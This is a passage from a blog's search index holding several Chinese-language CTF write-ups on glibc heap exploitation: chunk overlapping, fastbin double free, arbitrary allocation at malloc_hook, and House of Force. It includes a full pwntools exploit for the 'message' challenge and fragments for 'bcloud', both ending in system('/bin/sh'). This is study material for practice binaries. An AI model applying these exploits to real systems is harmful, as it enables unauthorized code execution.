class=\"string\">&#x27;role: &lt;0.teacher/1.student&gt;: &#x27;</span>)</span><br><span class=\"line\">io.sendline(<span class=\"string\">&#x27;0&#x27;</span>)</span><br><span class=\"line\">add_student(<span class=\"number\">1</span>)</span><br><span class=\"line\">change_role(<span class=\"number\">1</span>)</span><br><span class=\"line\">pray()</span><br><span class=\"line\">change_role(<span class=\"number\">0</span>)</span><br><span class=\"line\">give_score()</span><br><span class=\"line\">change_role(<span class=\"number\">1</span>)</span><br><span class=\"line\">check()</span><br></pre></td></tr></table></figure>\n<h2><span id=\"任意地址加1\">任意地址加1？</span></h2><p>​        reward提供给我们了两个功能，一个是leak heap，一个是任意地址+1。正如前面所说的那样，我们能很自然地想到利用off by one 构造 chunk overlapping，条件的话确实都是齐全的。</p>\n<p>​        并且虽然每一个student只能获得一次reward，但是我们能够申请很多个stu，并且程序提供给我们了change stu id功能，以至于每一个stu我们都能获得一次rewatd。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( HIDWORD(chunk_list[student_id]-&gt;is_lazy_pray_union) == <span class=\"number\">1</span> )<span class=\"comment\">// </span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;already gained the reward!&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<p>​        但是overlapping哪个chunk呢？其实不难想，只是这个题申请的东西乱七八糟的，东西太多了混淆了视听，但是仔细理一下，虽然程序功能很多，但是能对chunk进行写有意义的操作的只有comment ，set mode 和 never pray again。</p>\n<p>​        而never pray again看起来并不像是一个在过程中被溢出的chunk，而比较像是题目为我们刻意创造以修改<code>exit_hook</code>的。</p>\n<p>​        而set mode 的size则为固定的0x20，反观comment size却是结构体中的字段，也确实可以+1。</p>\n<p>​        所以我们可以大胆猜测，我们需要修改的就是comment chunk的size，那么沿着这个思路走下去，既然是单字节溢出，那么comment chunk的物理相邻堆块是什么？</p>\n<p>​        伪代码看着头晕的话，就动调一下吧。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-21%20%E4%B8%8B%E5%8D%8810.22.27.png\" alt=\"截屏2022-04-21 下午10.22.27\"></p>\n<p>​        </p>\n<p>​        可以比较清楚地看到comment chunk的下一个物理相邻的chunk是某个结构体chunk。我们则可以很轻易地将其<code>prev_inuse</code>位覆盖为0（这里控制好chunk size，不能以16字节对齐，从而使得当前chunk的最后八字节输入在下一个chunk的<code>prev_size</code>位上。）</p>\n<p>​        之前通过逆向我们可以知道程序分别为老师以及学生定义了一个结构体，而学生结构体的指针是保存在老师结构体中的。所以这里的可以被覆盖的chunk就是老师的结构体。也就是</p>\n<p>伪代码中v2指向的chunk。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-22%20%E4%B8%8B%E5%8D%882.14.52.png\" alt=\"截屏2022-04-22 下午2.14.52\" style=\"zoom:50%;\"></p>\n<p>​        这样我们就已经有溢出的target chunk了。但是注意到libc版本是2.31。这样我们就没有办法伪造chunk prev size位，并改prev inuse位为0来造成overlapping，所以如果我们只能溢出几个字节的话，就只能关注与chunk的size位。</p>\n<p>​        但是，但是。</p>\n<p>​        这个任意地址+1确实太离谱了，尤其还是在comment size是储存在chunk上的，地址是绝对可控的，所以我们可以精确到位地将size在十位甚至百位上修改。这样就能造成比较简单的堆溢出，然后直接将下一个chunk全部覆盖掉成为fake chunk。</p>\n<p>​        </p>\n<h2><span id=\"leak\">leak</span></h2><p>​        还是先考虑常规的unsorted bin leak，我们需要获得一个unsorted bin，再把它free后打印出来，考虑到程序没有uaf，我们需要想一些别的办法。</p>\n<p>​        target chunk肯定还是comment chunk，并且我们可以指定这个chunk size为unsorted bin chunk ，只是需要考虑怎么打印。</p>\n<p>​        程序的打印就是只有stu module的review comment，既然是review comment，有一点似曾相识，就是利用别的chunk 来操作需要打印的chunk。</p>\n<p>​        大概就是这么个逻辑，有uaf的unsorted bin leak就嗯打印，没有的话就需要借用别的一整个chunk的操作来打印这个chunk，所以这个题需要使得另外一个chunk的comment指针指向target chunk。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-23%20%E4%B8%8B%E5%8D%8810.17.08.png\" alt=\"截屏2022-04-23 下午10.17.08\">        </p>\n<p>​        再看一下结构。</p>\n<p>​        d310保存该id对应的comment的size，其上一个字段则是指向comment也就是d308指向的内容，所以假设这个id是1，我们就可以完全控制student 2的chunk。</p>\n<p>​        控制这个chunk首先比较简洁的方式是直接把comment chunk的size改成一个比较大的数，于是能直接打印出下一个comment chunk，而这个chunk 会在后面的步骤中被free，于是能够直接通过打印fd 和bk位从而leak libc。</p>\n<p>​        所以基本的思路就是，add stu 0 comment，然后对应size的地址内容+1，将size改为一个较大的数，然后直接edit comment，溢出下一个stu 以及teacher 结构体chunk，伪造其储存的comment chunk的size，然后free 下一个chunk的comment（这个chunk应该为一个small chunk/large chunk），最后通过打印comment1直接leak libc。    </p>\n<h3><span id=\"改freehook为one_gadget\">改freehook为one_gadget</span></h3><p>​        leak libc后，我们可以利用相似的方法直接覆盖comment指针为<code>free_hook</code>地址，然后二次edit comment改其内容为<code>one_gadget</code>。</p>\n<p>​        exp暂时不发。</p>\n","categories":["Binary_security"],"tags":["HEAP - ChunkOverlapping"]},{"title":"Message","url":"/2021/05/24/heap_challenge_message/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-JWwvKXmp\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> \n<p>第二道fastbin double free。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">free</span>(*(<span class=\"keyword\">void</span> **)&amp;dword_602060[<span class=\"number\">4</span> * v1 + <span class=\"number\">2</span>]);</span><br><span class=\"line\">      dword_602060[<span class=\"number\">4</span> * v1] = <span class=\"number\">0</span>;</span><br><span class=\"line\">      --dword_60204C;</span><br></pre></td></tr></table></figure>\n<p>这里没有把指针置为null，所以会产生uaf漏洞。</p>\n<p>ida大体分析了一下就会发现，由于没有后门函数，这道题会比上一道难。而且由于RELRO的开启，got所在的数据段是只读的，这里研究一下relro这个保护。</p>\n<p>uaf漏洞的利用方式有多种，其中就有修改got表达到任意地址写，从而getshel。但是RELRO这个保护，通过将got表所在的地址变成只读，有效阻止了got表覆盖攻击。</p>\n<!--具体可见https://blog.csdn.net/ylcangel/article/details/102625948-->\n<p>所以说这道题我们不能用覆盖got表的方式来getshell，而是需要用freehook劫持的方式。</p>\n<p>大体思路是先通过fastbin double free构造fake chunk指向储存chunk的content的地址并泄露puts函数的真实地址，再获得libc基址，借此修改freehook，使它指向system并调用。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#p = remote(&#x27;124.70.35.238&#x27;,23717)</span></span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./message&#x27;</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./message&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span>(<span class=\"params\">size,content = <span class=\"string\">b&#x27;a&#x27;</span></span>):</span></span><br><span class=\"line\">\tp.sendafter(<span class=\"string\">&#x27;:&#x27;</span>,<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">\tp.sendafter(<span class=\"string\">&#x27;:&#x27;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">\tp.sendafter(<span class=\"string\">&#x27;:&#x27;</span>,content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">free</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">\tp.sendafter(<span class=\"string\">&#x27;:&#x27;</span>,<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">\tp.sendafter(<span class=\"string\">&#x27;:&#x27;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span>(<span class=\"params\">idx,content</span>):</span></span><br><span class=\"line\">\tp.sendafter(<span class=\"string\">&#x27;:&#x27;</span>,<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">\tp.sendafter(<span class=\"string\">&#x27;:&#x27;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">\tp.sendafter(<span class=\"string\">&#x27;:&#x27;</span>,content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">\tp.sendafter(<span class=\"string\">&#x27;:&#x27;</span>,<span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">\tp.sendafter(<span class=\"string\">&#x27;:&#x27;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">add(<span class=\"number\">0x30</span>)<span class=\"comment\">#chunk0,set as the fake chunk</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>)<span class=\"comment\">#chunk1</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>)<span class=\"comment\">#chunk2</span></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">free(<span class=\"number\">1</span>)<span class=\"comment\">#fastbin: chunk1--&gt;chunk2--&gt;chunk1</span></span><br><span class=\"line\"></span><br><span class=\"line\">fake_chunk_addr = <span class=\"number\">0x602060</span> - <span class=\"number\">0x8</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,p64(fake_chunk_addr))<span class=\"comment\">#chunk3--&gt;1</span></span><br><span class=\"line\"><span class=\"comment\">#fastbin: fake_chunk--&gt;chunk1--&gt;chunk2--&gt;chunk1</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>)<span class=\"comment\">#chunk4--&gt;2</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>)<span class=\"comment\">#chunk5--&gt;1</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,p64(elf.got[<span class=\"string\">&#x27;puts&#x27;</span>]))<span class=\"comment\">#chunk6..&gt;fake chunk</span></span><br><span class=\"line\"><span class=\"comment\">#leak the address</span></span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">puts = u64(recv(<span class=\"number\">6</span>))</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;puts&#x27;</span>, puts)</span><br><span class=\"line\">libc_base = puts - libc.dump(<span class=\"string\">&#x27;puts&#x27;</span>)</span><br><span class=\"line\">system = libc_base + libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\">free_hook = libc_base + libc.dump(<span class=\"string\">&#x27;__free_hook&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">6</span>,p64(free_hook))</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,p64(system))</span><br><span class=\"line\"><span class=\"comment\">#free_hook = system</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x8</span>,<span class=\"string\">&#x27;/bin/shx00&#x27;</span>)</span><br><span class=\"line\">free(<span class=\"number\">7</span>)</span><br><span class=\"line\"><span class=\"comment\">#process system(/bin/sh)</span></span><br></pre></td></tr></table></figure>\n","categories":["Binary_security"],"tags":["HEAP - ChunkOverlapping"]},{"title":"fastbin中uaf实现任意地址分配的检测问题","url":"/2022/04/02/heap_fastbin%E4%B8%ADuaf%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%88%86%E9%85%8D%E7%9A%84%E6%A3%80%E6%B5%8B%E9%97%AE%E9%A2%98/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-jaDOraun\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> \n<p>​        目前做到的与fastbin有关（包括Tcache），并且存在uaf漏洞，需要通过任意地址分配来实现利用的题大致有两类，一类对于申请的chunk，通过简单或者复杂的结构体管理，在一个note的结构体中通常包括size，content甚至指针等字段，我们可以通过覆盖指针实现任意地址分配。另一类则是相对逻辑比较简单的，并没有为note定义结构体，仅仅使用了类似数组的形式，这样的话覆盖free chunk的fd就比较直观并且简单。</p>\n<p>​        但是无论哪种题目，当我们已经修改free chunk的fd，想要在指定地址分配chunk的时候，必须满足一些检测，或者说条件，不然就会有奇怪的报错，比如：</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-02%20%E4%B8%8A%E5%8D%888.28.00.png\" alt=\"截屏2022-04-02 上午8.28.00\"></p>\n<p>​        这里地址是随便找的栈地址，图一乐图一乐。</p>\n<p>​        既然是任意地址分配，按道理只要是可写的地址应该都能成功。这里直接研究如何将chunk分配至<code>malloc_hook</code>，也是使用场景较多的一种。</p>\n<p>​        其实绕过的核心还是在于，目标地址的chunk头域是否存在合法的size。</p>\n<p>​        比如说ctf-wiki上的<code>Arbitrary Alloc</code>一例，就是寻找malloc hook地址附近是否有符合fastbin大小范围的，可以用做size域的字节。如果有，则找到对应的偏移，申请target addr - offset处的地址就行。</p>\n<p>​        举例，题目是ciscn2019的double。</p>\n<p>​        前面的利用可以直接不管，现在我们需要在<code>malloc_hook</code>处构造fake chunk。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-09%20%E4%B8%8B%E5%8D%883.34.34.png\" alt=\"截屏2022-04-09 下午3.34.34\"></p>\n<p>​        查看<code>malloc_hook</code>附近的数据，发现<code>0x7ffff7dd4af0</code>地址附近的<code>\\x7f</code>数据是很适合作为size的，其所在的具体地址为<code>0x7ffff7dd4af5</code>，所以chunk头地址应该为<code>0x7ffff7dd4af5-0x8</code>，<code>0x7ffff7dd4aed</code>，与<code>malloc_hook</code>偏移为0x23。所以我们需要在fastbin fd为覆盖上<code>malloc_hook- 0x23</code>。</p>\n<p>​        </p>\n<p>​        也就是说，核心思路是构造chunk头的size域，无论是地址附近本身就有这样符合要求的字节，或者是通过输入等人为构造都是可以的。而且只要满足了这个条件，就基本能实现任意地址分配。</p>\n<p>​</p>\n","categories":["Binary_security"],"tags":["HEAP - Fastbin Attack"]},{"title":"bcloud","url":"/2022/03/25/heap_hof_bcloud/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-GytIpzaT\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#FFB11B\"></div>\n<h2><span id=\"overview\">overview</span></h2><h4><span id><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-25%20%E4%B8%8B%E5%8D%888.34.10.png\" alt=\"截屏2022-03-25 下午8.34.10\"></span></h4><p>​        partial relro，可以改got表，也可以劫持hook。</p>\n<h2><span id=\"re\">RE</span></h2><h3><span id=\"init\">init</span></h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">memset</span>(s, <span class=\"number\">0</span>, <span class=\"number\">0x50</span>u);</span><br><span class=\"line\"> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Input your name:&quot;</span>);</span><br><span class=\"line\"> my_read((<span class=\"keyword\">int</span>)s, <span class=\"number\">64</span>, <span class=\"number\">10</span>);</span><br><span class=\"line\"> v2 = (<span class=\"keyword\">char</span> *)<span class=\"built_in\">malloc</span>(<span class=\"number\">0x40</span>u);</span><br><span class=\"line\"> dword_804B0CC = (<span class=\"keyword\">int</span>)v2;</span><br><span class=\"line\"> <span class=\"built_in\">strcpy</span>(v2, s);                                <span class=\"comment\">// name is stored in heap</span></span><br><span class=\"line\"> welcome(v2);</span><br></pre></td></tr></table></figure>\n<h3><span id=\"add\">add</span></h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">9</span> &amp;&amp; content_chunk[i]; ++i )</span><br><span class=\"line\">    ;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( i == <span class=\"number\">10</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Lack of space. Upgrade your account with just $100 :)&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Input the length of the note content:&quot;</span>);</span><br><span class=\"line\">  v2 = read_num();</span><br><span class=\"line\">  content_chunk[i] = (<span class=\"keyword\">int</span>)<span class=\"built_in\">malloc</span>(v2 + <span class=\"number\">4</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !content_chunk[i] )</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">  size_chunk[i] = v2;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Input the content:&quot;</span>);</span><br><span class=\"line\">  my_read(content_chunk[i], v2, <span class=\"number\">10</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Create success, the id is %d\\n&quot;</span>, i);</span><br><span class=\"line\">  result = i;</span><br><span class=\"line\">  sync_chunk[i] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br></pre></td></tr></table></figure>\n<h3><span id=\"edit\">edit</span></h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Input the id:&quot;</span>);</span><br><span class=\"line\"> num = read_num();</span><br><span class=\"line\"> <span class=\"keyword\">if</span> ( num &lt; <span class=\"number\">0</span> || num &gt; <span class=\"number\">9</span> )</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Invalid ID.&quot;</span>);</span><br><span class=\"line\"> v2 = content_chunk[num];</span><br><span class=\"line\"> <span class=\"keyword\">if</span> ( !v2 )</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Note has been deleted.&quot;</span>);</span><br><span class=\"line\"> v3 = size_chunk[num];</span><br><span class=\"line\"> sync_chunk[i] = <span class=\"number\">0</span>;</span><br><span class=\"line\"> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Input the new content:&quot;</span>);</span><br><span class=\"line\"> my_read(v2, v3, <span class=\"number\">10</span>);</span><br><span class=\"line\"> <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Edit success.&quot;</span>);</span><br></pre></td></tr></table></figure>\n<p>​        </p>\n<h3><span id=\"free\">free</span></h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Input the id:&quot;</span>);</span><br><span class=\"line\">num = read_num();</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( num &lt; <span class=\"number\">0</span> || num &gt; <span class=\"number\">9</span> )</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Invalid ID.&quot;</span>);</span><br><span class=\"line\">ptr = (<span class=\"keyword\">void</span> *)content_chunk[num];</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( !ptr )</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Note has been deleted.&quot;</span>);</span><br><span class=\"line\">content_chunk[num] = <span class=\"number\">0</span>;</span><br><span class=\"line\">size_chunk[num] = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"built_in\">free</span>(ptr);</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Delete success.&quot;</span>);</span><br></pre></td></tr></table></figure>\n<h3><span id=\"sync\">sync</span></h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Syncing...&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">9</span>; ++i )</span><br><span class=\"line\">  sub_8048BF5(i);</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Synchronization success.&quot;</span>);</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-27%20%E4%B8%8A%E5%8D%8810.24.37.png\" alt=\"截屏2022-03-27 上午10.24.37\"></p>\n<p>在content chunk中储存了目前已经allocated的chunk的ptr。size chunk储存了chunk的size，sync记录了chunk的上传成功与否。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-27%20%E4%B8%8A%E5%8D%8810.26.39.png\" alt=\"截屏2022-03-27 上午10.26.39\"></p>\n<p>​        可以看到，如果只add一个0x4大小的note，三个记录的chunk的状态如上。</p>\n<h3><span id> </span></h3><h2><span id=\"利用\">利用</span></h2><h4><span id=\"确定思路\">确定思路</span></h4><p>​        目前先考虑更改got表的做法，劫持hook相对来说更加麻烦，反正都要leak libc。</p>\n<p>​        ps：在调试的时候发现如果是利<code>LD_PRELOAD</code>进行其他版本的libc加载的话，会使libc地址低于heap段，其实影响有限，原因也很好理解，但用关于<code>LD_PRELOAD</code>对于内存空间加载的影响的问题可能后面会写一篇笔记来专门研究。</p>\n<p><code>malloc_hook</code><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-27%20%E4%B8%8B%E5%8D%887.30.32.png\" alt=\"截屏2022-03-27 下午7.30.32\"></p>\n<p>​        程序在开始会申请很多乱七八糟的东西，不太好看。但是核心是先要改top chunk的size为-1,或者说0xffffffff，这里需要一些绕过，之后就相对常规。整体看来除了没有控制size以外似乎没有可以利用的漏洞了。</p>\n<p>此外或许可以更改<code>ptr_chunk</code>中top chunk的指针（不过这样似乎就不是hof了）。</p>\n<p>​        发现一些非常怪异的点，如果用<code>Ld_preload</code>加载自己的libc，那么topchunk和malloc hook的偏移也会改变，并且直接由低地址变为了高地址。需要更改的地址也更小，四舍五入更简单。</p>\n<h4><span id=\"漏洞点\">漏洞点</span></h4><p>​        看了很久，发现一个遗漏的点，在于<code>init()</code>    中，将s copy到v2中，是利用<code>strcpy</code>，这个之前在pwncollege中就被坑过，是一个人尽皆知的trick，利用覆盖空字节进行内存泄露。</p>\n<p>​        利用这个<code>strcpy</code>我们一共可以找到两个漏洞，第一个是print name的时候对于堆基址的泄露，另外一个是在填org和host的时候覆盖top chunk size为0xffffffff。</p>\n<p>​        覆盖size为0xffffffff后就相当于一个任意地址写了，为了leak libc，比较常规的思路是覆盖free got为puts got，以此打印atoi got来leak。leak之后利用edit来改atoi got为system从而getshell。</p>\n<h4><span id=\"泄露堆指针\">泄露堆指针</span></h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Input your name:\\n&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">64</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">b&#x27;Hey&#x27;</span>)</span><br><span class=\"line\">heap_base = u32(p.recv()[<span class=\"number\">65</span>:<span class=\"number\">69</span>])</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;heap_base: &#x27;</span> + <span class=\"built_in\">hex</span>(heap_base))</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-28%20%E4%B8%8B%E5%8D%884.56.17.png\" alt=\"截屏2022-03-28 下午4.56.17\">        </p>\n<p>​        我不理解，这个东西为什么还能有成功率。</p>\n<h4><span id=\"修改top-chunk-size\">修改top chunk size</span></h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">offset = heap_base - malloc_hook_addr - <span class=\"number\">0xd0</span> + <span class=\"number\">0x8</span></span><br><span class=\"line\">add(offset,<span class=\"string\">b&#x27;a&#x27;</span>)<span class=\"comment\">#chunk0,change top chunk ptr</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h4><span id=\"覆盖free-got-leak-libc-base\">覆盖free got, leak libc base</span></h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">payload = p32(<span class=\"number\">4</span>)*<span class=\"number\">32</span></span><br><span class=\"line\">payload += p32(free_got_addr)<span class=\"comment\">#chunk1</span></span><br><span class=\"line\">payload += p32(atoi_got_addr)<span class=\"comment\">#chunk2</span></span><br><span class=\"line\">payload += p32(atoi_got_addr)<span class=\"comment\">#chunk3</span></span><br><span class=\"line\">edit(<span class=\"number\">1</span>,p32(printf_plt_addr))<span class=\"comment\">#modify the free to printf</span></span><br><span class=\"line\">free(<span class=\"number\">2</span>)<span class=\"comment\">#print atoi_addr</span></span><br><span class=\"line\">atoi_addr = u32(p.recv(<span class=\"number\">4</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">libc_base = atoi_addr - libc.symbols[<span class=\"string\">&#x27;atoi&#x27;</span>]</span><br><span class=\"line\">system_addr = libc_base + libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br></pre></td></tr></table></figure>\n<h4><span id=\"getshell\">getshell</span></h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">3</span>,p32(system_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">10</span>,<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>\n","categories":["Binary_security"],"tags":["HEAP - House Of Force"]},{"title":"hitcon_training11","url":"/2022/03/24/heap_hof_hitcontraininf11/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>% meting “7342554262” “netease” “playlist” “theme:#555” “mutex:true” “listmaxheight:340px” “preload:auto” %}     </p>\n<h4><span id=\"re\">re</span></h4><p>​        含有后门函数，直接的想法是利用hof将chunk分配至某个可写的位置，然后覆盖为后门。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">v4 = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x10</span>uLL);</span><br><span class=\"line\"> *v4 = hello_message;</span><br><span class=\"line\"> v4[<span class=\"number\">1</span>] = goodbye_message;</span><br><span class=\"line\"> (*v4)();</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-25%20%E4%B8%8B%E5%8D%883.33.45.png\" alt=\"截屏2022-03-25 下午3.33.45\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"number\">5</span>:</span><br><span class=\"line\">    v4[<span class=\"number\">1</span>]();</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br></pre></td></tr></table></figure>\n<p>​        